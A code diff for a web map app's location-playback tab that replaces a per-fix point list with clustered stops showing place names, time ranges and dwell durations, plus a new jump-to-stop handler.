 // --- Playback Tab ---
@@ -5058,93 +5072,61 @@ function formatDistance(m) {
 
 function renderPlaybackTab() {
   const pts = playbackPoints.length ? playbackPoints : locationHistory;
-  // Deduplicate in-place by lat|lng|rounded_second
-  const seen = new Set();
-  for (let i = pts.length - 1; i >= 0; i--) {
-    const p = pts[i];
-    if (!p || !p.lat) { pts.splice(i, 1); continue; }
-    const sec = Math.floor((p.ts || 0) / 1000);
-    const k = `${p.lat.toFixed(4)}|${p.lng.toFixed(4)}|${sec}`;
-    if (seen.has(k)) { pts.splice(i, 1); }
-    else seen.add(k);
-  }
   const statsEl = document.getElementById('pbStats');
   const listEl = document.getElementById('pbPointList');
+  const stopsEl = document.getElementById('stopsCount');
   if (!pts.length) {
     statsEl.style.display = 'none';
-    listEl.innerHTML = '<div class="label">Load history to see points</div>';
+    listEl.innerHTML = '<div class="label">Load history to see stops</div>';
+    if (stopsEl) stopsEl.textContent = '';
     return;
   }
+  const stops = journeyStops.length ? journeyStops : clusterStops(pts);
   statsEl.style.display = 'block';
-  document.getElementById('stPoints').textContent = pts.length;
+  document.getElementById('stPoints').textContent = `${stops.length} stops \u00B7 ${pts.length} fixes`;
   const dur = pts.length > 1 ? pts[pts.length-1].ts - pts[0].ts : 0;
   document.getElementById('stDuration').textContent = formatDuration(dur);
   const dist = calcTrailDistance(pts);
   document.getElementById('stDistance').textContent = formatDistance(dist);
-  const roadDist = calcRoutedDistance();
-  if (roadDist !== null && roadDist > dist) {
-    document.getElementById('stRoadDist').textContent = formatDistance(roadDist) + ' (road)';
-  } else {
-    document.getElementById('stRoadDist').textContent = formatDistance(dist);
-  }
-  const haCount = pts.filter(p => p.isHighAccuracy).length;
-  document.getElementById('stHighAcc').textContent = haCount;
   const first = pts[0], last = pts[pts.length-1];
   document.getElementById('stRange').textContent = (first.ts && last.ts) ? pktTime(first.ts) + ' \u2192 ' + pktTime(last.ts) : '--';
-  const groups = {};
-  for (let i = 0; i < pts.length; i++) {
-    const p = pts[i];
-    const day = new Date(p.ts).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
-    if (!groups[day]) groups[day] = [];
-    groups[day].push({ idx: i, p });
-  }
-  let html = '<div class="pb-point-list">';
-  const activeIdx = playbackRunning ? playbackIdx : -1;
-  for (const [day, entries] of Object.entries(groups)) {
-    html += `<div class="pb-day">${day} <span style="font-weight:400;color:var(--muted)">(${entries.length})</span></div>`;
-    for (const { idx, p } of entries) {
-      const active = idx === activeIdx ? ' pb-point-active' : '';
-      const speed = p.speed != null ? (p.speed * 3.6).toFixed(1) + 'km/h' : '';
-      const acc = p.accuracy != null ? '\u00B1' + p.accuracy + 'm' : '';
-      const ha = p.isHighAccuracy ? '\u2B50' : '';
-      const sat = p.satellites ? p.satellites + '\uD83D\uDDF2' : '';
-      const meta = [ha, speed, acc, sat].filter(s => s).join(' ');
-      const haClass = p.isHighAccuracy ? ' pb-ha' : '';
-      const addrKey = p.lat.toFixed(3) + ',' + p.lng.toFixed(3);
-      const cached = cachedAddresses[addrKey];
-      const addrText = cached ? (cached.display_name || cached.name || '') : '';
-      const addrHtml = addrText
-        ? `<span class="ppt-addr done" title="${escHtml(addrText)}">${escHtml(addrText)}</span>`
-        : `<span class="ppt-addr loading" data-addr-key="${addrKey}" data-addr-lat="${p.lat}" data-addr-lng="${p.lng}">${cached === undefined ? '\u{1F4CD} resolving...' : '--'}</span>`;
-      html += `<div class="pb-point-row${active}${haClass}" data-pb-idx="${idx}">
-        <span class="ppt-ts">${p.ts ? pktShort(p.ts) : '--'}</span>
-        <span class="ppt-coord">${p.lat.toFixed(4)}, ${p.lng.toFixed(4)}</span>
-        <span class="ppt-meta">${meta || '--'}</span>
-        ${addrHtml}
-      </div>`;
-    }
+  if (stopsEl) stopsEl.textContent = stops.length + ' places';
+  let html = '<div class="journey-stops-list">';
+  for (let i = 0; i < stops.length; i++) {
+    const s = stops[i];
+    const dwell = formatDuration(s.endTs - s.startTs);
+    const addrKey = s.lat.toFixed(3) + ',' + s.lng.toFixed(3);
+    const cached = cachedAddresses[addrKey];
+    const addrText = cached ? (cached.display_name || cached.name || '') : '';
+    const placeHtml = addrText
+      ? `<span class="js-place" title="${escHtml(addrText)}">${escHtml(addrText)}</span>`
+      : `<span class="js-place loading" data-addr-key="${addrKey}" data-addr-lat="${s.lat}" data-addr-lng="${s.lng}">${cached === undefined ? 'Resolving address...' : s.lat.toFixed(5) + ', ' + s.lng.toFixed(5)}</span>`;
+    const timeStr = pktShort(s.startTs) + ' \u2013 ' + pktShort(s.endTs);
+    html += `<div class="journey-stop-row" data-stop-idx="${i}">
+      <span class="js-icon">\u{1F4CD}</span>
+      <span class="js-main">${placeHtml}<div class="js-time">${timeStr}</div></span>
+      <span class="js-dur">${dwell}</span>
+    </div>`;
   }
   html += '</div>';
   listEl.innerHTML = html;
-  listEl.querySelectorAll('.pb-point-row').forEach(el => {
+  listEl.querySelectorAll('.journey-stop-row').forEach(el => {
     el.addEventListener('click', function() {
-      const idx = parseInt(this.dataset.pbIdx);
-      jumpToPoint(idx);
+      jumpToStop(parseInt(this.dataset.stopIdx));
     });
   });
-  // Resolve uncached addresses in background
   resolvePlaybackAddresses();
 }
 
 function resolvePlaybackAddresses() {
-  const loading = document.querySelectorAll('.ppt-addr.loading[data-addr-key]');
+  const loading = document.querySelectorAll('.js-place.loading[data-addr-key]');
   if (!loading.length) return;
   loading.forEach(el => {
     const key = el.dataset.addrKey;
     if (cachedAddresses[key]) {
       const addr = cachedAddresses[key];
       el.textContent = addr.display_name || addr.name || '';
-      el.className = 'ppt-addr done';
+      el.className = 'js-place';
       el.title = el.textContent;
       return;
     }
@@ -5153,23 +5135,61 @@ function resolvePlaybackAddresses() {
     geocode(lat, lng).then(d => {
       if (d) {
         el.textContent = d.display_name || d.name || '';
-        el.className = 'ppt-addr done';
+        el.className = 'js-place';
         el.title = el.textContent;
       } else {
         el.textContent = '??';
-        el.className = 'ppt-addr';
+        el.className = 'js-place';
       }
     });
   });
 }
 
+let _lastHighlightedStop = -1;
 function highlightPointInList(idx) {
+  const pts = playbackPoints.length ? playbackPoints : locationHistory;
+  const stops = journeyStops.length ? journeyStops : clusterStops(pts);
+  const p = pts[idx];
+  let stopIdx = -1;
+  if (p) {
+    for (let i = 0; i < stops.length; i++) {
+      if (p.ts >= stops[i].startTs && p.ts <= stops[i].endTs) { stopIdx = i; break; }
+    }
+  }
+  const changed = stopIdx !== _lastHighlightedStop;
+  _lastHighlightedStop = stopIdx;
   const listEl = document.getElementById('pbPointList');
-  listEl.querySelectorAll('.pb-point-row').forEach(el => {
-    el.classList.toggle('pb-point-active', parseInt(el.dataset.pbIdx) === idx);
+  listEl.querySelectorAll('.journey-stop-row').forEach(el => {
+    el.classList.toggle('pb-point-active', parseInt(el.dataset.stopIdx) === stopIdx);
   });
-  const activeEl = listEl.querySelector('.pb-point-active');
-  if (activeEl) activeEl.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+  if (changed) {
+    const activeEl = listEl.querySelector('.pb-point-active');
+    if (activeEl) activeEl.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+  }
+}
+
+function jumpToStop(idx) {
+  if (playbackRunning) stopPlayback();
+  const pts = playbackPoints.length ? playbackPoints : locationHistory;
+  const stops = journeyStops.length ? journeyStops : clusterStops(pts);
+  if (idx < 0 || idx >= stops.length) return;
+  const s = stops[idx];
+  ensurePhoneMarker(s.lat, s.lng);
+  map.panTo([s.lat, s.lng], { animate: true, duration: 0.3 });
+  let best = 0, bestD = Infinity;
+  for (let i = 0; i < pts.length; i++) {
+    const d = haversine(pts[i].lat, pts[i].lng, s.lat, s.lng);
+    if (d < bestD) { bestD = d; best = i; }
+  }
+  playbackIdx = best;
+  const p = pts[best];
+  const totalSegs = Math.max(1, pts.length - 1);
+  document.getElementById('playScrubber').value = Math.floor((best / totalSegs) * 1000);
+  document.getElementById('playCount').textContent = `${best + 1}/${pts.length}`;
+  updatePlaybackUI(p);
+  document.getElementById('playTsStart').textContent = pts[0].ts ? pktTime(pts[0].ts) : '--';
+  document.getElementById('playTsEnd').textContent = pts[pts.length-1].ts ? pktTime(pts[pts.length-1].ts) : '--';
+  highlightPointInList(best);
 }
 
 function jumpToPoint(idx) {
